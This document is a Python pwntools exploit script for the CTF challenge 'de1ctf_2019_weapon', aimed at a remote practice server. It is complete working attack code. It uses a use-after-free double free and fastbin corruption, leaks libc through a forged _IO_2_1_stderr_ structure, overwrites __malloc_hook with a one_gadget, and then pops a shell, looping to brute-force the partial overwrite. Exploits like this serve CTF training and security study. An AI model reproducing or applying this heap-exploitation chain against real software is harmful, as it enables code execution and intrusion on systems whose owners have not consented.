#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/06/17 19:42:12
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    sh = process('de1ctf_2019_weapon')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
else:
    IP = 'node3.buuoj.cn'
    port = 26223
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
    one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
elf = ELF('de1ctf_2019_weapon')

def cmd(choice):
    sh.recvuntil("choice >> \n")
    sh.sendline(str(choice))


def add(idx,size,content):
    cmd(1)
    sh.recvuntil("wlecome input your size of weapon: ")
    sh.sendline(str(size))
    sh.recvuntil("input index: ")
    sh.sendline(str(idx))
    sh.recvuntil("input your name:\n")
    sh.send(content)


def dele(idx):
    cmd(2)
    sh.recvuntil("input idx :")
    sh.sendline(str(idx))


def edit(idx,content):
    cmd(3)
    sh.recvuntil("input idx: ")
    sh.sendline(str(idx))
    sh.recvuntil("new content:\n")
    sh.send(content)

def pwn():
    add(0,0x10,"aaaa")
    add(1,0x10,"aaaa")
    add(2,0x60,"aaaa")
    add(3,0x10,"aaaa")


    # UAF => double free
    dele(0)
    dele(1)
    dele(0)

    add(0,0x10,p64(0) + p64(0x21))
    add(8,0x60,"aaaaaaaa")
    edit(1,"\x10")
    add(4,0x10,"aaaa")
    add(5,0x10,"bbbb")
    edit(5,p64(0) + p64(0x71))
    edit(2,"\x00"*0x40+p64(0)+p64(0x21))
    dele(1)
    edit(5,p64(0) + p64(0x91))
    dele(1)
    edit(1,p8(0xdd)+p8(0x85))
    edit(5,p64(0)+p64(0x71))
    payload = "\x00" * 3 + p64(0) * 6 + p64(0xfbad1887)
    payload += p64(0) * 3 + "\x00"
    add(6,0x60,"aaaa")
    add(7,0x60,payload)
    libc_base = u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00")) -192 -libc.symbols['_IO_2_1_stderr_']
    log.info("Success leak libc_base:0x%x"%libc_base)
    malloc_hook = libc_base + libc.symbols['__malloc_hook']
    dele(1)
    dele(2)
    edit(2,p64(malloc_hook-0x23))
    add(0,0x60,"aaaa")
    add(0,0x60,"\x00"*0x13 + p64(libc_base+one_offset[3]))
    cmd(1)
    sh.recvuntil("wlecome input your size of weapon: ")
    sh.sendline("1")
    sh.sendline(";cat flag")
    sh.interactive()
while True:
    try:
        sh = remote(IP,port)
        libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
        one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
        pwn()
    except Exception as e:
        sh.close()
        continue

sh.interactive()